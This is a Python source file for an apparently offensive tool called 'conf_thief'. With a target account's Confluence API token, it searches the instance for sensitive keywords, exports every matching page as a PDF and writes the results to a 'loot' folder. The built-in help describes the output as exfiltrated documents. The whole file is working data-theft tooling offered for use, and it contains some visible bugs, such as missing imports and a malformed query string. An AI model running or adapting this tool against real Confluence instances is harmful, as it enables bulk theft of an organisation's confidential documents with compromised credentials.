import requests, json, sys, getopt

# Set that holds all of the pages found in the keyword search
contentSet = set()

# for proxying through Burp using ENV variables
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Set these ENV Variables to proxy through burp:
# export REQUESTS_CA_BUNDLE='/path/to/pem/encoded/cert'
# export HTTP_PROXY="http://127.0.0.1:8080"
# export HTTPS_PROXY="https://127.0.0.1:8080"

default_headers = {
    'Accept': 'application/json',
}

form_token_headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Atlassian-Token": "no-check",
}

def getNumberOfPages(query, username, access_token, cURL):
    totalSize = 0
    q = "/wiki/rest/api/search"
    URL = cURL + q
    response = requests.request("GET",
        URL,
        auth=(username, access_token),
        headers=default_headers,
        params=query
    )

    jsonResp = response.json()
    totalSize = int(jsonResp["totalSize"])
    return totalSize

def searchKeyWords(path, username, access_token, cURL):
    search_term = " "
    q = '/wiki/rest/api/search?start=1&limit=250'
    try:
        f = open(path, "r")
    except Exception as e:
        print('[*] An Error occured opening the dictionary file: %s' % str(e))
        sys.exit(2)

    print("[*] Searching for Confluence content for keywords and compiling a list of pages")
    for line in f:
        tempSetCount = len(contentSet)
        count = 0
        search_term = line.strip()
        query = {
            'cql': '{text~\"' + search_term + '\"}'
        }
        totalSize = getNumberOfPages(query, username, access_token, cURL)
        if totalSize:
            URL = cURL + q
            searchQuery = {
                'cql': '{text~\"' + search_term + '\"'
            }

            response = requests.request("GET",
                URL,
                auth=(username, access_token),
                headers=default_headers,
                params=searchQuery
            )

            jsonResp = json.loads(response.text)
            for results in jsonResp['results']:
                pageId = ""
                contentId = results['content']['id']
                pageId_url = results['url']
                if "pageId=" in pageId_url:
                    pageId = pageId_url.split('pageId=')[1].split('&')[0]
                    contentSet.add(pageId)
                else:
                    contentSet.add(contentId)
            if len(contentSet) > tempSetCount:
                count = len(contentSet) - tempSetCount
                tempSetCount = len(contentSet)
            print("[*] %i unique pages added to the set for search term: %s." % (count, search_term))
        else:
            print("[*] No documents found for search term: %s" % search_term)
    #print(contentSet)
    print("[*] Compiled set of %i unique pages to download from your search" % len(contentSet))

def downloadContent(username, access_token, cURL):
    headers = form_token_headers
    print('[*] Downloading files')
    count = 1
    for contentId in contentSet:
            url = cURL + "/spaces/flyingpdf/pdfpageexport.action?pageId={pageId}".format(pageId=contentId)
            url = get_pdf_download_url_for_confluence_cloud(cURL, url, username, access_token)
            try:
                response = requests.request("GET",
                    url,
                    auth=(username, access_token),
                    headers=headers
                )
                path = 'loot/' + contentId + '.pdf'
                with open(path, 'wb') as f:
                    f.write(response)
                print('[*] Downloaded %i of %i files: %s.pdf]' % (count, len(contentSet), contentId))
                count += 1
            except Exception as err:
                print("Error : " + str(err))

def get_pdf_download_url_for_confluence_cloud(cURL, url, username, access_token):
    """
    Confluence cloud does not return the PDF document when the PDF
    export is initiated. Instead it starts a process in the background
    and provides a link to download the PDF once the process completes.
    This functions polls the long running task page and returns the
    download url of the PDF.
    :param url: URL to initiate PDF export
    :return: Download url for PDF file
    """
    download_url = None
    try:
        long_running_task = True
        headers = form_token_headers
        print("Initiate PDF export from Confluence Cloud")
        response = requests.request("GET",
            url,
            auth=(username, access_token),
            headers=headers
        )
        print("DEBUG: url = " + url)
        response_string = response.content.decode(encoding="utf-8", errors="strict")
        print("DEBUG: response_string = " + response_string)
        task_id = response_string.split('name="ajs-taskId" content="')[1].split('">')[0]
        print("DEBUG: task_id = " + task_id)
        poll_url = cURL + "/runningtaskxml.action?taskId={0}".format(task_id)
        while long_running_task:
            long_running_task_response = requests.request("GET",
                url=poll_url,
                auth=(username, access_token),
                headers=default_headers,
            )
            long_running_task_response_parts = long_running_task_response.content.decode(
                encoding="utf-8", errors="strict"
            ).split("\n")
            percentage_complete = long_running_task_response_parts[6].strip()
            is_successful = long_running_task_response_parts[7].strip()
            is_complete = long_running_task_response_parts[8].strip()
            time.sleep(5)
            print("Check if export task has completed.")
            if is_complete == "<isComplete>true</isComplete>":
                if is_successful == "<isSuccessful>true</isSuccessful>":
                    print("PDF Export Percentage Complete: " + percentage_complete)
                    print("Extracting taskId from PDF.")
                    current_status = long_running_task_response_parts[3]
                    download_url = current_status.split("href=&quot;/wiki/")[1].split("&quot")[0]
                    long_running_task = False
                elif is_successful == "<isSuccessful>false</isSuccessful>":
                    log.error("PDF conversion not successful.")
                    return None
            else:
                print("PDF Export Percentage Complete: " + percentage_complete)
    except Exception as err:
        print("Error: " + str(err))
        return None

    return download_url



def main():
    cURL=""
    dict_path = ""
    username = ""
    access_token = ""

    # usage
    usage = '\nusage: python3 conf_thief.py [-h] -c <TARGET URL> -u <Target Username> -p <API ACCESS TOKEN> -d <DICTIONARY FILE PATH>'

    #help
    help = '\nThis Module will connect to Confluence\'s API using an access token, '
    help += 'export to PDF, and download the Confluence documents\nthat the target has access to. '
    help += 'It allows you to use a dictionary/keyword search file to search all files in the target\nConfluence for'
    help += ' potentially sensitive data. It will output exfiltrated PDFs to the ./loot directory'
    help += '\n\narguments:'
    help += '\n\t-c <TARGET CONFLUENCE URL>, --url <TARGET CONFLUENCE URL>'
    help += '\n\t\tThe URL of target Confluence account'
    help += '\n\t-u <TARGET CONFLUENCE ACCOUNT USERNAME>, --user <TARGET USERNAME>'
    help += '\n\t\tThe username of target Confluence account'
    help += '\n\t-p <TARGET CONFLUENCE ACCOUNT API ACCESS TOKEN>, --accesstoken <TARGET CONFLUENCE ACCOUNT API ACCESS TOKEN>'
    help += '\n\t\tThe API Access Token of target Confluence account'
    help += '\n\t-d <DICTIONARY FILE PATH>, --dict <DICTIONARY FILE PATH>'
    help += '\n\t\tPath to the dictionary file.'
    help += '\n\t\tYou can use the provided dictionary, per example: "-d ./dictionaries/secrets-keywords.txt"'
    help += '\n\noptional arguments:'
    help += '\n\n\t-h, --help\n\t\tshow this help message and exit\n'

    # try parsing options and arguments
    try :
        opts, args = getopt.getopt(sys.argv[1:], "hc:u:p:d:", ["help", "url=", "user=", "apitoken=", "dict="])
    except getopt.GetoptError as err:
        print(str(err))
        print(usage)
        sys.exit(2)
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print(help)
            sys.exit()
        if opt in ("-c", "--url"):
            cURL = arg
        if opt in ("-u", "--user"):
            username = arg
        if opt in ("-p", "--accesstoken"):
            access_token = arg
        if opt in ("-d", "--dict"):
            dict_path = arg

    # check for mandatory arguments
    if not username:
        print("\nUsername  (-u, --user) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    if not access_token:
        print("\nAccess Token  (-p, --access_token) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    if not dict_path:
        print("\nDictionary Path  (-d, --dict) is a mandatory argument\n")
        print(usage)
        sys.exit(2)
    if not cURL:
        print("\nConfluence URL  (-c, --url) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    # Strip trailing / from URL if it has one
    if cURL.endswith('/'):
        cURL = cURL[:-1]

    searchKeyWords(dict_path, username, access_token, cURL)
    downloadContent(username, access_token, cURL)

if __name__ == "__main__":
    main()
